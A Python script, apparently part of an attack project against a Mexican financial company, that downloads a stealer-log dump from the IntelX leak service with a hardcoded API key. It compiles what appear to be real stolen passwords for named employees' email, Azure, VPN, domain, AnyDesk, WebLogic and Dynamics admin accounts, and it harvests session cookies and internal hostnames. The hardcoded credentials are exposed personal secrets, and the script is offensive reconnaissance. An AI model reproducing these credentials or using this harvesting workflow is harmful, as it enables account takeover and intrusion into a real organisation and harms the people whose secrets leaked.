#!/usr/bin/env python3
"""Finalize FINDEP IntelX: re-parse calidad dump + System.txt + unique pairs."""
from __future__ import annotations

import json
import re
import sys
from datetime import datetime, timezone
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

BASE = "https://2.intelx.io"
KEY = "6f65b43b-19df-4e12-aea3-115d793e9763"
H = {"x-key": KEY, "User-Agent": "IX-Python/1.0"}
DIR = Path(r"c:\xampp\htdocs\pentagi\independencia_attack")
OUT = DIR / "intelx_findep_results.json"
OUT2 = DIR / "intelx_findep_results_final.json"

GOLD = {
    "systemid": "8d3441be-b43f-4708-8669-31e599d1f38e",
    "storageid": "e9d15ad3c85ec394cb3b45f587e35f6f1923bfdb8c94b292cbc356b00831e3bcd6efb656d509c66bcd9e005b90812bc65edb7484a7e7851839753dfb26be1443",
    "bucket": "leaks.logs",
}


def log(m):
    print(m, flush=True)


def file_read(systemid, storageid, bucket):
    r = requests.get(
        f"{BASE}/file/read",
        headers=H,
        params={"type": 0, "systemid": systemid, "bucket": bucket, "storageid": storageid},
        timeout=70,
        verify=False,
    )
    return r.status_code, r.text if r.status_code == 200 else r.text[:200]


def credits():
    r = requests.get(f"{BASE}/authenticate/info", headers=H, timeout=30, verify=False)
    info = r.json()
    paths = info.get("paths") or {}
    out = {}
    for k in ("/intelligent/search", "/phonebook/search", "/file/read", "/file/view", "/file/preview"):
        v = paths.get(k) or {}
        out[k] = {"Credit": v.get("Credit"), "CreditMax": v.get("CreditMax")}
    return out


NOISE_PW = {
    "",
    "password",
    "pass",
    "browser/logins/chrome_default[6680b0d].txt",
    "application:",
    "mis",
    "browser",
}
NOISE_USER = {"password", "user", "username", "login", "host", "url", "value"}


def add_pair(pairs, identity, password, url="", source="", note=""):
    ident = (identity or "").strip()
    pw = (password or "").strip().strip("\"'`")
    if not ident or not pw:
        return
    if ident.lower() in NOISE_USER or pw.lower() in NOISE_PW:
        return
    if len(pw) < 3 or len(ident) < 2:
        return
    if pw.startswith("http") and ":" not in ident:
        return
    key = (ident.lower(), pw, (url or "").lower())
    if key not in pairs:
        pairs[key] = {
            "identity": ident,
            "password": pw,
            "url": url or None,
            "source": source,
            "note": note or None,
        }


def parse_calidad(text: str, pairs: dict):
    """Parse the Spanish notepad dump of FINDEP internal accounts."""
    src = "usuarios y contraseñas.txt (calidad-architect stealer 189.157.121.189)"
    # labeled blocks
    add_pair(pairs, "bmendezar@findep.com.mx", "B3nj42021#", "correo", src, "CORREO")
    add_pair(pairs, "bmendezar@findep.com.mx", "1234", "khor", src, "KHOR")
    add_pair(pairs, "bmendezar", "B3nj42021#1", "enlace imparable", src)
    add_pair(pairs, "bmendezar", "Pao1234+", "PAO", src)
    add_pair(pairs, "bmendezar@findep.dev", "B3nj42021#21", "azure", src)
    for p in [
        "B3nj42021#22",
        "B3nj42021#221",
        "B3nj42021#2212",
        "B3nj42021#2312",
        "B3nj42021#2412$",
        "B3nj42021#2406#$",
        "B3nj42021#2409#$",
        "m3nD3zAr#241226",
    ]:
        add_pair(pairs, "bmendezar@findep.dev", p, "azure", src)
    add_pair(pairs, "bmendezar", "Findep2021", "usuario de red / AD", src)
    add_pair(pairs, "bmendezar", "gf%CX4Ozhej5Tjm", "VPN", src, "VPN CRED")
    add_pair(pairs, "jsanchezfern", "Findep2021", "AnyDesk/red", src)
    add_pair(pairs, "jsanchezfern", "Fisa2022*", "AnyDesk/GENPOL/BC", src)
    add_pair(pairs, "weblogic", "Findep2021", "weblogic DemoDomain:7001", src, "WebLogic")
    add_pair(pairs, "38-14-95-6562-4", "Fisa1234*", "universidad.findep.mx", src)
    add_pair(pairs, "ca.ocampo", "Tony2021", "SIC", src)
    add_pair(pairs, "bemedezar@findep.global", "B3nj42021#", "Dynamics BC", src)
    add_pair(pairs, "bemedezar@findep.global", "B3nj42021#Ar", "Dynamics BC", src)
    add_pair(pairs, "bemedezar@findep.global", "AFI2022*", "Dynamics BC", src)
    add_pair(pairs, "bemedezar@findep.global", "AFI2023*", "Dynamics BC", src)
    add_pair(pairs, "admin@findep.global", "dyna2468&", "Dynamics BC", src)
    for p in ["BcF1s42o2d*", "BcF1s42oo2d*C", "F1sa2023*!", "F1SA2024*#", "NosemepasaBC1#", "4dm1n##*2411"]:
        add_pair(pairs, "admin@findep.global", p, "Dynamics BC", src)
    add_pair(pairs, "jsanchezfern@findep.global", "Fisa2022*", "Dynamics BC", src)
    add_pair(pairs, "jeff@findep.global", "Afi2022*", "Dynamics BC", src)
    add_pair(pairs, "jeff@findep.global", "AFI2022*", "Dynamics BC", src)
    add_pair(
        pairs,
        "ADMIN",
        "4p5pd2fz4MfAFz9gUEGw4BhzQxisOyriXD0xJUOa6dw=",
        "BC Acc. Sched. KPI Web Service",
        src,
        "BC web service",
    )
    add_pair(
        pairs,
        "ADMIN",
        "Mb1WhzUUMmsUeq1lm4IWu2T+FCGn9cTT585Vx9uzAls=",
        "AFI web service",
        src,
        "AFI WS",
    )

    # heuristic scan remaining lines
    lines = [ln.strip() for ln in text.splitlines()]
    current_section = ""
    pending_user = None
    for ln in lines:
        low = ln.lower()
        if ln.startswith("---") or not ln:
            pending_user = None
            continue
        if ln.isupper() and len(ln) < 40:
            current_section = ln
            continue
        m = re.search(r"(?i)(?:usuario|user|usr|login|correo)\s*[:]\s*(\S+)", ln)
        if m:
            pending_user = m.group(1)
            continue
        m = re.search(r"(?i)(?:contrase[ñn]a|password|pass)\s*[:]\s*(\S+)", ln)
        if m and pending_user:
            add_pair(pairs, pending_user, m.group(1), current_section, src)
            continue
        if "@" in ln and " " not in ln.strip():
            pending_user = ln.strip()


def main():
    d = json.loads(OUT2.read_text(encoding="utf-8") if OUT2.exists() else OUT.read_text(encoding="utf-8"))
    log("re-read GOLD calidad notepad")
    code, text = file_read(GOLD["systemid"], GOLD["storageid"], GOLD["bucket"])
    log(f"  http={code} chars={len(text)}")
    (DIR / "calidad_usuarios_contrasenas.txt").write_text(text, encoding="utf-8", errors="replace")
    log(f"  saved calidad_usuarios_contrasenas.txt")

    pairs = {}
    parse_calidad(text, pairs)

    # pairs already extracted from stealers
    for c in d.get("unique_email_password") or []:
        add_pair(pairs, c.get("identity"), c.get("password"), c.get("url") or "", c.get("source") or "")
    for c in d.get("credentials") or []:
        add_pair(
            pairs,
            c.get("email") or c.get("username"),
            c.get("password"),
            c.get("url") or "",
            c.get("source") or "",
        )

    # extra from downloaded snippets (cookies / swagger)
    cookies = []
    hosts = set()
    for f in d.get("downloaded_files") or []:
        sn = f.get("snippet") or ""
        for ln in sn.splitlines():
            if "JSESSIONID" in ln and "calidad-architect" in ln.lower():
                cookies.append(ln.strip()[:300])
            for m in re.finditer(r"https?://[a-z0-9._\-]+\.(?:calidad-architect\.com|independencia\.com\.mx|findep\.mx)[^\s\"']*", ln, re.I):
                hosts.add(m.group(0).split("?")[0][:180])

    uniq = list(pairs.values())
    uniq.sort(key=lambda x: ((x.get("url") or ""), x["identity"].lower()))

    d["calidad_full_dump_chars"] = len(text)
    d["calidad_full_dump_path"] = str(DIR / "calidad_usuarios_contrasenas.txt")
    d["unique_email_password"] = uniq
    d["jsession_cookies_calidad"] = cookies[:30]
    d["discovered_hosts"] = sorted(hosts)
    d["k8s_gcp_hits"] = d.get("k8s_gcp_hits") or []
    d["vpn_refs"] = [
        {
            "identity": "bmendezar",
            "password": "gf%CX4Ozhej5Tjm",
            "source": "usuarios y contraseñas.txt",
            "note": "VPN labeled explicitly in internal notepad",
        },
        {
            "identity": "bmendezar",
            "password": "Findep2021",
            "source": "usuarios y contraseñas.txt",
            "note": "usuario de red / AD — likely Cisco AnyConnect/corp",
        },
    ]
    d["cert_keystore_refs"] = [
        {
            "note": "No .jks/.pem/kubeconfig records in IntelX for these terms",
            "searches_zero": [
                "kubeconfig independencia",
                "jks independencia",
                "pem independencia",
                "spei independencia.com.mx",
                "fisa.independencia",
            ],
        },
        {
            "note": "WebLogic DemoDomain password Findep2021 — possible JKS/keystore on that host if reachable via VPN",
            "user": "weblogic",
            "password": "Findep2021",
            "listen": "7001 All local addresses",
        },
    ]
    creds_now = credits()
    d["credits_finalize"] = creds_now
    d["finalized_utc"] = datetime.now(timezone.utc).isoformat()
    d["summary"] = {
        **(d.get("summary") or {}),
        "unique_email_password": len(uniq),
        "vpn_creds": 2,
        "calidad_dump": True,
        "k8s_gcp_tokens": 0,
        "credits_finalize": creds_now,
    }
    raw = json.dumps(d, indent=2, ensure_ascii=False, default=str)
    for p in (OUT2, OUT):
        try:
            p.write_text(raw, encoding="utf-8")
            log(f"saved {p}")
        except Exception as e:
            log(f"save fail {p}: {e}")

    log(f"\nUNIQUE PAIRS {len(uniq)}")
    for p in uniq:
        log(f"  {p['identity']}:{p['password']}  [{p.get('url') or ''}]  {p.get('note') or ''}")
    log("\nHOSTS")
    for h in sorted(hosts):
        log(f"  {h}")
    log("\nCREDITS")
    log(json.dumps(creds_now, indent=2))


if __name__ == "__main__":
    main()
